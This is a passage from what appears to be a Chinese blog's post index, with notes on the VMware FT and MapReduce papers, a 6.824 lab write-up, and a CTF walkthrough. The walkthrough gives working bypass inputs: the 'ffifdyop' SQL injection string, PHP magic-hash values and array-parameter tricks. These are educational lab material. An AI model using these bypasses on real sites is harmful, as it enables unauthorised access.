buffer的使用可能会使磁盘操作减慢，但并没有造成任何可见的性能损失。第三，在primary出错时，可能会有一些尚未完成的磁盘IO，此时backup成为primary。新的primary没有办法确定磁盘IO是否开始或完成。并且因为磁盘IO不是在backup VM上从外部发出的，因此当新的primary继续运行时也不会有显式的磁盘IO完成通知，最终会造成VM中的guest OS中断或重置进程。因为即使在IO成功完成时返回一个错误是可以接受的，因此可以发送一个错误完成来通知每个IO出错。但是guest OS可能不会从自己的本地磁盘中响应这些错误，因此作者重新启动backup VM go live过程中挂起的IO。因为消除了所有的竞争，并且所有的IO直接指明了访问的是哪个磁盘块或内存块，因此即使这些磁盘操作已经成功完成了也是可以进行重复的。为什么新的primary没法确认磁盘IO是否完成？backup与primary的状态应该是一致的，primary自身也无法确认磁盘IO是否完成？来自FAQ的答案：这些无法确认是否完成的IO指的backup收到了启动IO的日志，但没有收到IO结束的日志。因此这部分需要重新开始。Implementation Issues for Network IOVMware vSphere为VM网络通信提供了多种性能优化。某些优化基于hypervisor异步更新虚拟网络设备的状态。例如，接收缓冲在VM执行时可以直接被hypervisor更新。但是除非能够保证状态更新发生在backup和primary指令流的同一点，否则会导致不确定性，因而backup的执行就可能与primary出现分歧。FT网络仿真代码最大的变化是禁用了异步的网络优化。使用输入网络包异步更新VM的ring buffer的代码被修改为强制guest陷入到hypervisor，因此能够记录这一更新并将其应用到VM。类似地，从发送队列中异步的取出网络报文的代码也被禁用，并且也是通过trap来完成。作者采用了两种方式来提高运行FT时VM的网络性能。首先，实现了集群优化来减少VM的陷入和中断。当VM在以足够的速率发送流式数据时，hypervisor可以每一组报文执行一次陷入，最好情况下是不执行陷入，因为可以将传输报文作为接收新报文的一部分（我的理解是类似于TCP，在发送时捎带确认？），类似地，hypervisor可以通过仅发布一组网络报文的中断来减少VM中断的数量。第二个性能优化包括减少传输报文的延迟。前面提到，hypervisor必须延迟所有的传输报文直到接收到来自backup对于日志的确认。因此降低延迟的关键是降低发送日志消息和接收来自backup确认的时间。作者主要的优化是确保发送和接收日志记录和确认不需要任何线程上下文的切换。VMware vSphere hypervisor允许函数在TCP协议栈注册，并在收到TCP数据时在推迟的执行上下文调用（类似tasklet）tasklet是这样的，将中断服务程序分为上半部和下半部，上半部要求立刻完成，而下半部的优先级较低，因此可以推迟到以后来完成，先对中断响应，然后把所有并不要求立刻完成的中断服务程序放到之后完成。类比一下，对于收到的TCP数据立刻响应，然后等到空闲后再处理TCP数据。因此能够迅速处理backup收到的日志消息和primary收到的确认而不需要上下文切换。FAQ from 6.824为什么在VM上实现确定性比物理服务器更加容易？因为VM存在hypervisor模拟和控制硬件，从而消除primary和backup之间的不同。例如可以通过hypervisor来精确控制时钟中断。hypervisor是VM的一部分，与Virtual Machine Monitor相同。hypervisor模拟了一台计算机，guest OS在上面运行。论文中的FT作为hypervisor的一部分，primary和backup是guest OS.GFS和FT都提供了一致性，二者的区别和优劣？FT提供了强一致性，并且backup复制了primary的计算过程，并且只有primary与client进行通信，因此对于client是透明的。GFS只为存储提供了容错，因此复制过程比FT更加高效。例如GFS不需要处理中断来让所有的副本保持完全一致，因而提供的是弱一致性。GFS通常作为一个大型容错服务的一部分，例如VMware FT依赖于primary和backup之间共享存储，因此需要一个容错存储服务，GFS可以提供此功能。bounce buffer是如何避免竞争的？考虑这种情况：通过DMA从磁盘拷贝数据到内存，同时有个应用程序正在读取这一内存，那么应用读到的数据有两种可能：一种是读到旧的，一种是读到来自DMA的数据，具体取决于CPU的调度。如果primary和backup上同时遇到了这种情况，并且做出了不同的选择，即primary可以读到DMA的数据，backup读不到DMA的数据，就无法再保持二者的状态完全一致。在backup和primary同时执行时，数据不会直接拷贝到内存中。首先将磁盘块拷贝到私有的bounce buffer中，此时primary无法访问，因而也就不会出现与应用程序的竞争。当拷贝完成时，FT hypervisor中断primary，然后将bounce buffer拷贝到primary的内存中，然后允许primary继续执行。FT在logging channel上将数据发送给backup。backup的FT在同一指令处中断backup将数据拷贝到相同的为止，然后返回给backup继续执行。这样做的效果是对于primary和backup来说，二者看到的来自磁盘和网络的数据始终保持一致，因此不会出现状态不一致的情况发生。" }, { "title": "MapReduce--Simplified Data Processing on Large Clusters", "url": "/_posts/MapReduce/", "categories": "论文阅读, Distributed Systems", "tags": "Distributed Systems, 论文阅读", "date": "2022-09-28 00:00:00 +0000", "snippet": "Abstractmapreduce是一个用于处理和生成大数据集的编程模型。用户指定一个用于处理键值对的函数来生成键值对集合的中间表示，和一个reduce函数来合并与相同的key相关联的中间值。许多真实任务可以使用此模型来表达。按照这种函数模型编写的程序可以在计算机集群上并行运行。运行时系统负责划分输入数据的细节，在不同的机器上调度程序的执行，处理机器错误和管理内部机器之间的通信。这允许程序员...", "content": "Abstractmapreduce是一个用于处理和生成大数据集的编程模型。用户指定一个用于处理键值对的函数来生成键值对集合的中间表示，和一个reduce函数来合并与相同的key相关联的中间值。许多真实任务可以使用此模型来表达。按照这种函数模型编写的程序可以在计算机集群上并行运行。运行时系统负责划分输入数据的细节，在不同的机器上调度程序的执行，处理机器错误和管理内部机器之间的通信。这允许程序员不需要任何并行与分布式系统的只是就能够利用大量的分布式系统资源。论文中的mapreduce实现在大型集群中运行，并具有高度的可扩展性：经典的MapReduce在数千台机器上处理许多TB字节的数据。并且MapReduce已经被证明易于使用：超过一千个MapReduce作业每天都在Google集群上执行。1 Introduction在过去的五年中，作者和Google的同事实现了数千个用于处理大量的元数据（例如爬取的文件、页面请求日志等）的计算任务，来计算不同类型的派生数据，例如倒排索引，web页面的不同的图结构表示，每台主机每天爬取的页面的总结、最频繁的请求数量等。大部分这样的计算是概念清晰的，但是输入数据通常非常庞大，并且计算过程必须被分发到数百或数千台机器上以在可接受的时间内完成。需要用大量的代码来解决并行计算、分配数据和处理故障等问题，从而掩盖了原本的简单计算。为了解决这样的复杂性问题，设计了一个新的抽象，这一抽象能够运行我们表达原本的简单计算过程，并将大量的并发、容错和数据分发、负载均衡的细节隐藏在库中。我们的抽象来自于Lisp和许多其他函数时语言中存在的map和reduce原语的启发。我们意识到大部分计算过程包括对每个输入中的逻辑记录应用map操作，来计算中间键值对的集合，然后对所有使用映射到相同key的value进行reduce操作，来将派生出的数据恰当地结合起来。我们使用的用户指定map和reduce操作的函数模型能够轻易地实现并行化大型计算和使用重新执行作为容错的主要机制。MapReduce的主要贡献是提供了一个能够实现自动并行化和大规模计算的分发的接口，结合这个接口的实现，能够在大规模的商用机集群中实现高性能计算。2 Programming ModelMapReduce输入和输出均为键值对的集合，MapReduce库的用户使用Map和Reduce两个函数来表达计算过程。Map由用户提供，对于输入的键值对，产生中间的键值对表示。MapReduce将所有的宇相同的中间key I相关联的值划分为同一组，并将其传递给Reduce函数。Reduce函数同样由用户提供，接收中间key I和与I相关的value的集合作为输入。将这些value合并以产生一个更小的value的集合。通常，每次reduce调用只产生零个或一个输出。中间值通过迭代器提供给Reduce函数使用，因而能够处理规模太大而无法放入内存的值列表。2.1 Example考虑计算在大规模的文档集合中计数每个单词出现次数的问题。用户可能会有如下伪代码：map(String key, String value):\t// key: document name\t// value: document contents\tfor each word w in value:\t\tEmitInttermediate(w, \"1\");\t\treduce(String key, Iterator values):\t//key: aword\t// values: a list of counts\tint result = 0;\tfor each v in values:\t\tresult += ParseInt(v);\tEmit(AsString(result));map函数对于value中的每个word，执行EmitInttermediate(加上word的出现次数)，reduce函数把所有的对于与某一个word相关联的发射的所有出现次数求和。此外，用户使用输入和输出文件的名字和可选的调整参数来填充mapreduce specification对象。然后调用MapReduce函数并将specification对象传递给MapReduce。用户代码通过MapReduce库链接在一起。2.2 Types从概念上讲，用户所提供的map和reduce函数具有相关联的类型： map\t (k1, k2)\t\t\t\t\t\t\t\t-&gt; list(k2, v2) reduce (k2, list(v2)) -&gt;list(v2)即输入的key和value来自与输出的key和value不同的域。此外，中间key和value域输出的key和value具有相同的域。怎么理解域？ 为什么上面说具有相同的域？对于输入的（k1, k2)，map生成了（k2, v2)这样的键值集合，而reduce将相同的k2对应地value合并成了list，并最终输出list(v2)?3 ImplementationMapReduce接口有很多可能的实现方式，具体实现方式取决于具体的环境。例如，某种方式可能适用于小型共享内存机器，而另一种可能适用于大型的NUMA多处理机，或是用于更大规模的多台机器组成的互联网络。本节描述的实现使用于Google广泛使用的计算环境：通过交换以太网连接在一起的大型商用PC集群。 每台PC通常使用双路X86处理器(dual-processor x86 processors)，具有2~4GB内存，运行Linux操作系统。 使用商用的网络硬件：通常机器级100Mb/s或1Gb/s，但平均的bit带宽会小很多 由数百或数千台机器组成的集群，因此会有很多机器出错 存储由直接插入到每台机器上的IDE硬盘来提供。内部的分布式文件系统用于管理这些硬盘存储，文件系统使用备份在不可信的硬件上提供可用性和可靠性。 用户向调度系统提交作业，每个作业包括一系列任务，并被调度器映射到集群中一系列空闲的机器中运行。3.1 Execution OverviewMap调用通过自动将输入数据划分为M个split的集合来被分布到多个机器上。输入的split可以被不同机器并行处理，Reduce调用通过使用划分函数(例如hash(key) mod R)将intermediate key划分为R个不同的片来分发到不同的机器上。划分数量R和划分函数由用户指定。下图展示了MapReduce的完整过程。在用户程序调用MapReduce时，将会依次执行如下过程（图中的序号代表了对应的编号）： 用户程序中的MapReduce首先将输入文件划分为M个片，通常每个片的大小为16~64MB（由用户通过可选参数来确定）。然后在集群中启动程序（每台机器运行一份程序的拷贝）。 其中一个程序的拷贝比较特殊，成为master。其他的程序由master安排任务，称为worker。共有M个Map任务和R个Reduce任务供master分配。master选择一个空闲的worker，然后为其分配一个Reduce或是Map任务。 执行map任务的worker读取相关的输入split的内容，从输入的数据中解析出key/value对，并将每个key/value对传递给用户定义的Map函数。Map函数所产生的intermediate key/value对缓存在内存中。 缓存的键值对周期性地写入到本地磁盘中，通过划分函数划分为R个块（划分成R个块的目的是什么？）。这些在本地磁盘上的键值对的位置被传回给master，master负责将这些位置转发给执行reduce函数的worker。 当reduce worker收到master传来的地址后，使用远端过程调用(RPC)来从map worker的本地磁盘中读取缓存的键值对。当reduce worker读取了所有的中间数据后，通过intermediate key来进行排序，所以具有相同key的所有value被分到相邻的位置。由于通常许多不同的key映射到相同的reduce任务，因此排序是必须的（什么叫不同的key映射到相同的reduce任务？ 因为一个Reduce处理的intermediate key/value中不可能只有一个key）如果数据量太大而不能全部装入内存，则使用外部排序。 reduce worker在排序后的中间数据上迭代，并且对于遇到的每个唯一的intermediate key，将key和对应的intermediate value的集合传递给用户的Reduce函数。Reduce函数的输出被附加到这个reduce partition的最终输出文件后。 在所有的map任务和reduce任务完成后，master唤醒用户程序，此时，用户程序对于MapReduce的调用结束，控制权重新回到用户程序。在MapReduce成功结束运行后，MapReduce的输出在R个输出文件中（每个Reduce任务生成一个输出文件，一共分成了R个Reduce任务，输出文件名由用户指定）。通常用户不需要将R个输出文件合并为一个，而是将R个输出文件作为另一个MapReduce调用或者其他的分布式应用的输入。3.2 Master Data Structuresmaster使用了多个数据结构。master需要保存每个map task和reduce task的状态：idle, in-progress和completed，对于不处于idle状态的worker机器，还需要保存其身份（map/reduce？）。master是将中间文件区域的位置从map task传递到reduce task的枢纽。因此，对于每个处于completed状态的map task，master保存了map task产生的R个中间文件区域的位置和大小。master在map task完成时收到对于这些文件区域的大小和位置的更新，这些信息被逐步发送给正在进行reduce task的worker机器。3.3 Fault Tolerance因为MapReduce的主要目的是使用数百上千台机器来帮助处理大量数据，因此必须能够容忍机器损坏。Worker Failuremaster周期性ping每台worker机器，如果在规定的时间内没有收到来自worker的相应，那么master就将这台worker标记为failed. 任何被worker完成的map task都将被重置为初始的空闲状态，并因此这些task将会能够在其他的worker上进行调度。(调度的单位是task而不是worker?)类似地，在failed worker上运行的map或reduce task也将会被重置到idle状态以重新调度。处于完成状态的map task在任务失败时重新执行，因为其输出储存在failed machine的本地硬盘上，对于执行reduce task的worker来说时不可达的。而处于完成状态的Reduce task不需要重新执行，因为输出储存在全局文件系统中。当一个map task首先被A执行，在A failed之后被重新调度为被B执行时，，master将会通知所有的正在执行reduce task的worker。所有的还没有从A读取数据的reduce task都将会从B读取。MapReduce可以容忍大量的worker failure。例如，在MapReduce计算过程中， 网络维护造成了80台机器在几分钟内同时离线。master将会选择合适的worker来重新执行被不可达的worker完成的map task，最终完成MapReduce.Master Failure很容易让master来周期性地保存上述master数据结构的checkpoint。如果master task离线，那么一个新的备份将会从上一个checkpointd state恢复。但是由于只有一个master，其故障地可能性并不大，因此如果master离线，会终止MapReduce运行。客户端可以检查这种情况并在需要时重新进入MapReduce操作。Semantics in the Presence of Failures当用户提供的map和reduce是关于输入的确定性函数时，我们的分布式实现将会产生与串行的程序相同的输出。我们依靠原子化的map commits和reduce task的输出来实现这一特性。每个task将输出写入到私有的临时文件中。reduce task创建一个这样的文件，而map task创建R个这样的文件（相当于为每个reduce task创建一个，并且这R个文件应该完全相同？）当map task完成时，发送一条消息通知master，其中包含了R个临时文件的文件名。如果master收到了一个来自已经处于completed状态的map task的完成消息，将其忽略（因为重复？为什么会引起重复？）否则将会在master 数据结构中记录R个文件的名字。当reduce task完成时，reduce worker原子地将临时输出文件重命名为最终的输出文件。如果相同的reduce task在多台机器上被执行，那么将会同时进行多个重命名操作，并且重命名的为一个文件。依赖于底层文件系统所提供的原子化的重命名操作来保证最终文件系统状态仅包含由一个reduce task执行所产生的数据。（我的疑惑在于，map创建了R个临时文件，这R个文件彼此之间是相同的吗？如果不是，这R个文件之间的关系是什么？如果是，那么每个reduce task都需要读取M个map task的输出，相当于每个reduce task进行的是重复计算，会出现相当大的冗余。对应地，reduce创建的是最终文件，那么相当于R个reduce每个创建了1/R个最终文件，拼起来才是完整的输出？）map创建的R个临时文件，彼此并不相同，而是使用key % nReduce将其映射到不同的reduce worker来处理。这R个临时文件组合起来构成了这个map worker对于其输入文件处理后产生输出的集合。每个reduce读取与其task id相同的中间输出文件，并将文件中具有相同的key的value合并，输出mr-out-id文件，将所有的reduce worker的输出文件合并，就是完整的输出文件我们的map和reduce操作的大部分是确定性的，并且我们的MapReduce语义与顺序执行是等价的，因此对于程序员来说可以容易地理解他们程序的行为。当map和reduce是不确定的时，我们提供weaker but still reasonable语义。对于不确定的操作来说，reduce task R1的输出等价于由这个不确定程序顺序执行的R1的输出。然而，另一个不同的reduce task R2的输出可能对应于由非确定性程序的不同顺序执行产生的R2的输出。考虑map task M 和reduce task R1和R2，将已经commit的Ri的执行定义为e(Ri)。weaker的语义之所以出现，是因为e(R1)已经读取了M的一次执行产生的输出，而e(R2)可能已经读取了M的另一次不同执行的输出。3.4 Locality网络带宽在我们的计算环境中是一种稀缺的资源，因此利用输入数据（由GFS管理）保存在组成集群的机器的本地磁盘上这一事实来节省带宽。GFS将每个文件划分成64MB的块，并在不同的机器上保存每个块的备份（通常是每个块保存3个备份）。MapReduce master考虑输入文件的位置信息并且尝试在已经包含输入数据 副本的机器上调度map task（这样可以减少输入数据在不同机器之间的传输）。如果未能够成功调度，那么尝试在离具有副本的机器更近的worker上调度map task（例如选择与存有副本的机器连接到同一台交换机的worker）。在集群中的大部分worker上运行MapReduce时，大部分输入数据都是本地读取的，因此并不会产生网络带宽。3.5 Task Granularity我们将map阶段划分成M个片，将reduce阶段划分成R个片。理论上，M和R应该会比worker的数量大很多。让每个worker执行不同的task提升了动态负载均衡的效果，并且同样在一个worker离线时加速了恢复过程：这台离线的worker所完成的map任务可以分布在所有其他的worker上。（我又不懂了：不同worker所执行的map之间的关系是什么？为什么说可以分布在其他的worker上？ 不同worker所执行的map之间是相互独立的，master可以任意地将一个task安排给不同的worker来执行）在实践上M和R有着固定的边界：因为master必须进行O（M+R）次调度并在内存中保存O（M*R）个状态。（实际上内存占用的常量因子很小：O(M*R)个状态由每个大约1字节的map task/reduce task对组成）。此外，R通常被用户限制，因为每个reduce task的输出是一个单独的文件。实际上我们倾向于选择M以使每个单独的任务使用大约16MB到64MB的输入数据（从而与上述局部性优化有效），并将 R设置为需要使用的worker数量的比较小的倍数。在使用2000台worker时，通常将M设置为200000，R设置为5000.3.6 Backup Tasks一个常见的造成MapReduce总的执行时间延长的原因是，在计算过程中往往存在一个straggler，需要使用很长时间去完成最后几个map或reduce任务。产生straggler的原因有很多，例如由于硬盘损坏导致读性能从30MB/s降到1MB/s；集群调度系统可能调度其他task到这台机器上，由于CPU、内存、本地磁盘和网络带宽的竞争造成其执行MapReduce的效率降低。我们最近遇到的一个问题是由于机器初始化代码bug导致的处理器cache被禁用，受影响机器上的计算速度降低到不到原来的1%。我们有一个通用的避免straggler问题的机制。当MapReduce接近完成时，master调度剩余的正在进行中任务的备份执行。在primary或是备份完成时，就将这个任务标记为已完成。我们调整了这个机制，使其一般情况下使用的计算资源增加不超过几个百分点。这显著减少了完成大型MapReduce操作的时间。例如如果禁用备份任务机制，那么5.3描述的排序任务所需的时间将会提升44%。4 Refinements尽管简单的Map和Reduce在大部分情况下已经足够有效，我们依然发现了一些有用的扩展。4.1 Partioning FunctionMapReduce的用户将reduce task/输出文件的值设置为R。通过在intermediate key上使用划分函数将数据划分到这些reduce task中。默认的划分函数是使用哈希算法hash(key) mod R. 哈希算法通常会产生公平的划分，但是在某些情况下，使用其他的关于key的函数会非常有效。例如，又是输出的key是URL，并且我们希望单个主机的所有条目都在同一个输出文件中。为了能够支持这种情况，用户可以提供特殊的划分函数，例如hash(Hostname(urlkey)) mod R，从而能够将具有相同host的所有的url都能够输出到同一个输出文件中。4.2 Ordering Guarantees我们确保对于给定的划分函数，中间键值对按照key的递增序被处理。这种顺序保证了每个划分都能够生成一个有序的输出文件，因而在输出文件格式需要支持高效的对于key随机访问查询或是用户需要排序后的数据时非常有效。4.3 Combiner Function在某些情况下，每个map task所产生的中间key具有大量的重复，而用户指定的reduce函数是可交换的和可关联的。一个例子是Section 2.1中提到的count，因为单词频率往往遵循Zipf分布（只有少数单词经常被使用，大部分的单词很少被使用），每个map task将会产生数百上千个&lt;the, 1&gt;这样的记录。所有的对于the的记录都将会在通过网络发送到一个reduce task然后被这个reduce task加到一起。因此用户可以通过指定一个Combiner函数，在map task将记录在发送到网络中之前首先进行部分合并，从而减少对于带宽的占用。Combiner函数在每个运行map task的机器上执行，通常combiner和reduce函数的代码是一致的，二者之间唯一的差别是MapReduce如何处理函数的输出。reduce函数的输出被写入到最终的输出文件中，而combiner函数的输出被写入到map的中间文件中，然后被发送到reduce task作为reduce的输入。实践证明部分合并能够极大提高某些类型的MapReduce的运行效率。4.4 Input and Output TypesMapReduce提供了对于多种读入格式的支持。例如，text类型的输入将每一行视为键值对，key是当前行在文件中的偏移，而value是当前行的内容。另一种常见的受支持格式存储按键排序的键值对序列。每种输入类型的实现知道如何将其自身划分成有意义的范围，以便作为单独的映射任务进行处理，例如对于文本模式来说，范围划分确保仅在行边界处进行划分。用户可以通过提供reader接口的来实现对新的输入类型的支持，尽管大部分用户仅仅使用预定义的输入类型:slightly_smiling_face:。​reader并不一定需要提供从文件读取数据的功能。例如，从数据库中读取记录或是从一个映射到内存的数据结构读取都是可行的。输出类型与输入类似。4.5 Side-effects某些情况下，MapReduce用户发现生成辅助文件作为其map和reduce的附加输出非常方便。我们依靠应用程序编写者来使这些side-effects具有幂等性和原子性。通常，这些应用写入一个临时文件，并在写入完成后原子地将临时文件重命名。我们不支持单个任务生成的多个输出文件的原子two-phase commits。因此，生成多个输出文件并且具有跨文件一致性要求的任务应该是确定性的。（什么叫two-phase commits? 上文一直在说的commit指的是什么？ 我的理解是，对于map task，输出文件必须一次性写入到tempfile中，然后原子地对其重命名，对于reduce worker，同样将合并后的结果写入到mr-out文件中，而不允许先写入一半，等后续处理完后再提交另一半)4.6 Skipping Bad Records用户代码中可能存在导致Map或Reduce函数在某些记录上崩溃的bug。这种错误将会导致MapReduce无法正确完成。我们提供了一种可选的执行模式，其中MapReduce库检测哪些记录会导致确定性崩溃并跳过这些记录以使程序继续向前推进。每个worker进程安装一个能够捕获分段错误和总线错误的信号处理程序。在调用用户的Map或Reduce函数之前，MapReduce在全局变量中保存参数的序列号。如果用户代码生成了一个信号，信号处理程序向master发送一个包含了序列号的”last gasp” UDP报文。当master看到在某个记录上出现多次错误时，master在重新执行相应的Map或Reduce任务时将这个记录标记为应该被跳过的。4.7 Local Execution调试Map或者Reduce函数通常非常困难，因为实际的计算过程通常发生在包括数千台机器的分布式系统中，工作分配决策由master动态做出。为了帮助调试分析和小规模测试，我么你开发了MapReduce的替代实现，在本地机器上按顺序执行MapReduce的所有工作。控制前提供给用户，因此可以用来执行特定的map task。用户通过特定的flag调用他们的程序，并因此可以使用任何调试或测试工具来帮助测试。4.8 Status Informationmaster运行一个内部的HTTP服务器，并导出一组状态页面以供使用。状态页面显示了当前计算的进度，例如多少个任务已经完成，多少个进程正在执行，输入的字节数，中间数据的字节数，输出数据的字节数，处理速率等。同样包含到每个任务生成的标准错误和标准输出文件的的链接。用户可以使用这些数据来预测计算需要多长时间，以及是否应该添加更多的计算资源，还可以帮助确定是否计算比预期更慢。另外，顶层的状态页面显示哪个worker处于离线状态以及离线时正在处理的map/reduce任务。这一信息可以用来帮助查找用户代码中的bug。Section 4.9 &amp; Chapter 5 &amp; 6 &amp; 7 &amp; 8略。Lab 1 MapReduce 设计与实现coordinatorcoordinator的作用为论文中提到的master，用于为worker分配任务和处理错误。主要包括几个部分：1. RPC Get(args int, reply *GetTaskReply) error 用于处理worker对于任务的请求，调用checkTask来选择一个未完成的任务分配给worker。 Register (args UNUSED, reply *int) error worker启动时调用Register在Coordinator中完成注册，UNUSED为空结构体，表示不需要参数 MapReport(args MapReport, reply *UNUSED) error 在Map任务完成后，调用MapReport通知Coordinator任务已完成，使用Coordinator分配的任务号作为参数。Coordinator在收到report后，将对应的任务状态设置为END，并将输入文件状态设置为FINISHED。由于MapReduce要求所有的Map任务完成后再开始Reduce任务，因此Coordinator需要遍历MapTask来判断是否进行任务阶段的切换。如果所有的任务都已完成，则调用awakeRoutine来唤醒正处于等待状态的worker（如果有）进入下一阶段的处理。 ReduceReport(args ReduceReport, reply *UNUSED) error Coordinator收到ReduceReport后，首先将对应的任务状态设置为END，然后检查ReduceTask，如果所有的任务都已经完成，则将done设置为true，表示MapReduce已经完成。 2. schedule tickSchedule() 周期性启动一个goroutine来执行schedule，直到所有的任务都已完成为止。 schedule() 遍历TaskMap，判断每个任务是否已经超时，如果超时，则将对应的任务状态设置为FAILED，并调用taskReschedule函数选择一个worker来重新运行此任务。 awakeRoutine() 仅需调用c.cond.Broadcast()来唤醒所有在此条件变量上wait的goroutine，goroutine被唤醒后自行调用checkTask来选择合适的任务交付给worker执行。 taskReschedule(taskid int) 仅当schedule发现某个任务运行超时时被调用，因此taskReschedule的主要功能就是重置任务状态，并调用awakeRoutine唤醒等待中的routine。 checkTask(workerid int, reply *GetTaskReply) 这是整个Coordinator中设计最为复杂的一部分。 我分别设置了ReduceTask和MapTask用于跟踪对应的任务状态， 其中分别有nReduce和len(fileMap)个任务，因为Reduce Task最多有nReduce个，MapTask的数量与输入的文件相同。同时将其中的任务初始化为UNSTARTED。 那么如何从MapTask和ReduceTask中选取合适的任务？首先定义了mCounter和rCounter分别记录已经分配的任务数，如果任务数没有超过最大允许的任务数量，那么很简单，只需要使用counter作为索引，将对应的任务设置为RUNNING，并传给worker任务号和文件名即可。如果任务数超过了最大允许的任务数量，那么说明前面分配的任务出现了FAILED的情况，因此遍历TaskMap，找出对应的任务分配给worker执行。如果没有找到，说明当前所有的任务都已经有worker执行，使用cond.Wait()将当前goroutine阻塞，等待schedule发现任务超时时唤醒。 如何处理并发因为coordinator结构体中大部分都是被多个协程共享的变量，因此需要使用sync.Mutex来实现互斥。go 语言标准库中的RPC会在连接到来时自动启动一个协程来处理，因此实际上需要自己启动协程的部分只有tickSchedule和schedule两部分。server中使用go http.Serve启动一个协程来监听worker发来的请求，MakeCoordinator使用go tickSchedule来周期性调用go schedule，检查任务执行情况。一个困扰我很久的问题是在worker的请求到来时，如果没有合适的任务应该怎么处理？一开始使用channel机制来完成阻塞，为每一个任务初始化一个channel，在awakeRoutine中使用channel &lt;-true来唤醒阻塞的routine，但是在测试时遇到了一个问题，如果采用容量为1的channel，那么会存在上一个写入的true没有取出，而新的awakeRoutine又要写入新的内容的情况，这样就会导致整个程序死锁。但是如果采用容量不为1的channel，一方面容量不好确定，另一方面无法保证阻塞。最后选择了使用条件变量来完成这一功能。遇到的另一个坑在于，cond.Wait()在结束时会自动加锁，然后调用checkTask函数进行分配，而我们的checkTask在一开始也会加锁，因此又会产生死锁。所以需要在checkTask之前手动进行解锁。Workerworker在接收RPC分配的任务后，本质上是串行的，因此总体上比较简单，只需要死循环，不断地请求任务、完成任务、报告（什么牛马）。在debug的过程中，我才真正理解了读论文时感到迷惑的Map的输出和Reduce的输入的关系。我们假设有M个Map任务，R个Reduce任务，那么每个Map都需要产生R个中间文件，其中保存的是Map处理后产生的键值对，每个键值对的key通过ihash产生一个编号（编号的范围是0~R），这个编号就对应的是后续对其进行处理的Reduce Task的编号，按照映射将键值对写入到合适的输出中。而在Reduce时，就需要遍历M个Map的输出，将其产生的与当前任务编号对应的输出文件读取、排序、合并、处理，最后输出到out文件中。由于没有理解mrsequential中Reduce的输出过程，我刚开始的sort是在Map中sort的，而Reduce就无法正确地将具有相同key的来自不同Map的键值对合并，从而导致了indexer和wc test失败。Reference6.824 Lab 1: MapReduce (mit.edu)RPC and ThreadsDebugging by Pretty Printing (josejg.com)" }, { "title": "BJDCTF2020 Easy MD5", "url": "/_posts/EasyMD5/", "categories": "CTF", "tags": "CTF, MD5", "date": "2022-09-15 00:00:00 +0000", "snippet": "访问靶机，初始页面如图所示：看上去像是SQL注入，尝试注入后并没有反应，F12查看源码，看到其中存在提示：Hint: select * from 'admin' where password=md5($pass,true)因此需要找到使password=md5($pass, true)返回值为true的$pass。md5函数的用法： 参数 描述 ...", "content": "访问靶机，初始页面如图所示：看上去像是SQL注入，尝试注入后并没有反应，F12查看源码，看到其中存在提示：Hint: select * from 'admin' where password=md5($pass,true)因此需要找到使password=md5($pass, true)返回值为true的$pass。md5函数的用法： 参数 描述 string 必需 raw 可选，raw为true，16位二进制形式；raw为false，32位二进制形式     根据SQL注入的经验，只要md5的返回值为’xxx’ or ‘1xxxxx’（根据MySQL规则，只要以数字开头，返回值就为true，并且纯数字不需要使用引号），就可以使返回值为true。存在一个最常用的pass:ffifdyop，其对应的32位md5码为276f722736c95d99e921722cf9ed621c，转换为ASCII编码后为'or'6&lt;trash&gt;*(为乱码），（*Mysql将hex编码转换为ASCII处理*）因此输入ffifdyop后条件判断为true，跳转到新的页面：同样查看网页源代码，可以看到存在提示：&lt;!--$a = $GET['a'];$b = $_GET['b'];if($a != $b &amp;&amp; md5($a) == md5($b)){ // wow, glzjin wants a girl friend.--&gt;要求通过get方式上传a和b两个变量，要求a!=b并且md5(a) == md5(b)。PHP中==表示弱等于，在进行比较时，会先将两边的变量转换成相同的类型，而以0e开头的数字/字符会被视为科学计数法，无论e后跟随的字符是什么都会被视为0，因此只要传递两个md5码均为0e开头的字符串作为变量即可。有两个常用的QNKCDZO和s214587387a，作为参数构建payload：/levels91.php?a=QNKCDZO&amp;b=s214587387a，进入下一关。这一关给出的提示为：&lt;?phperror_reporting(0);include \"flag.php\";highlight_file(__FILE__);if($_POST['param1']!==$_POST['param2']&amp;&amp;md5($_POST['param1'])===md5($_POST['param2'])){ echo $flag;}与上一关不同的地方在于，这里使用了===，即强等于进行判断。上面提到的绕过弱等于的办法不适用于强等于，因此需要采用其他绕过办法。PHP的md5函数存在这样一个特性，如果输出的参数为数组，那么会返回NULL，因此只要使用POST方法传递两个不同的数组，即可获得最后的flag。使用hackbar构造POST请求，得到最终的flag：REFERENCE[BUUOJ记录] [BJDCTF2020]Easy MD5 - Ye’sBlog - 博客园 (cnblogs.com)PHP弱类型hash比较缺陷 - Ye’sBlog - 博客园 (cnblogs.com)BUUCTF BJDCTF2020 Easy MD5 详解 - junlebao - 博客园 (cnblogs.com)" }, { "title": "Tai-e Assignment 3 死代码检测", "url": "/_posts/Tai-e-Assignment3/", "categories": "程序分析", "tags": "程序分析", "date": "2022-09-09 00:00:00 +0000", "snippet": " 『 无论你是玩游戏多，还是成绩不太好，觉得自己没有别人毕业有优势，这都是因为浮躁、去比较产生的事情。这门课，老师希望你重新的审视自己，不断地认识自己、挖掘自己，看看真的什么东西能让你你快乐起来，什么东西能让你花时间去搞。哪怕你以后只是开了一家奶茶店，哪怕是一个和计算机毫无相关的行业，也希望你能从这门课中清楚的认识到自己喜欢的是什么，你不是没有别人优秀，你只是选择了你喜欢的事情。 』 \t\t...", "content": " 『 无论你是玩游戏多，还是成绩不太好，觉得自己没有别人毕业有优势，这都是因为浮躁、去比较产生的事情。这门课，老师希望你重新的审视自己，不断地认识自己、挖掘自己，看看真的什么东西能让你你快乐起来，什么东西能让你花时间去搞。哪怕你以后只是开了一家奶茶店，哪怕是一个和计算机毫无相关的行业，也希望你能从这门课中清楚的认识到自己喜欢的是什么，你不是没有别人优秀，你只是选择了你喜欢的事情。 』 \t\t\t\t\t——李樾Overview死代码指的是程序中不会执行的代码或是执行结果不会被其他计算过程用到的代码。本次作业所要检测的代码只包括两种：不可达代码和无用赋值不可达代码考虑两种不可达代码，即控制流不可达和条件分支不可达。控制流不可达代码指的是不存在从程序入口到该段代码的控制流路径。例如:int controlFlowUnreachable() { int x = 1; return x; int z = 42; // control-flow unreachable code foo(z); // control-flow unreachable code}检测方式：遍历cfg，标记可达代码，剩下的就是不可达代码。分支不可达代码Java中仅有两种分支语句：switch和if。对于if语句来说，如果条件值是常数，那么必然会产生不可达代码。例如：int unreachableIfBranch() { int a = 1, b = 0, c; if (a &gt; b) c = 2333; else c = 6666; // unreachable branch return 